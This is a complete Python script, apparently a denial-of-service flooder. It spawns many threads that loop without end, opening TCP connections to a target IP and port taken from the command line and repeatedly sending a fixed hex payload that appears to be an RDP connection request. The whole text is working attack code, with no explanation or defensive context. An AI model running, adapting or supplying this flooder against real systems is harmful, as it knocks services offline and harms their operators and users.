import os,sys
import socket, threading
ip = str(sys.argv[1])
port = int(sys.argv[2])
threads = int(sys.argv[3])
conn = int(sys.argv[4])

def run():
    data = bytearray.fromhex("030000130ee00000000000010008000b000000") # Payload
    while True:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
            s.connect((ip, port))
            s.send(data)
            print("[+] Sended ("+str(len(data))+") => "+ip+":"+str(port))
            for x in range(conn):
                s.send(data)
        except:
            s.close()

for y in range(threads):
    th = threading.Thread(target=run)
    th.start()
